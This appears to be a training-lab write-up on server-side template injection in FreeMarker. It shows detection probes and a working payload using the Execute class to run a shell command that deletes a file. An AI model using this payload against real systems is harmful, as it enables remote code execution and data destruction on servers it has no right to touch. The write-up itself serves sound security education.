# Lab: Server-side template injection using documentation

## Description
This lab contains an SSTI vulnerability. We need to identify the template engine and use its documentation to find a way to execute arbitrary code.

## Analysis
The application has a "message" parameter when a product is out of stock.
Testing with `${7*7}` results in `49`, which indicates a Java-based or similar engine.
Testing with `#{7*7}` also results in `49`. This is common in FreeMarker.

## Exploitation
Looking at the FreeMarker documentation, there is a `freemarker.template.utility.Execute` class that can be used to execute shell commands.

### Steps
1. Navigate to a product page and trigger the "out of stock" message.
2. Confirm the vulnerability with `${7*7}`.
3. Use the following FreeMarker payload to execute `rm /home/carlos/morale.txt`:
   `<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("rm /home/carlos/morale.txt")}`

## Payload
```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("rm /home/carlos/morale.txt")}
```

## Takeaways
- Once the template engine is identified, the official documentation is the best source for finding exploitation vectors.
- Many template engines have built-in features that are extremely dangerous if exposed to users.
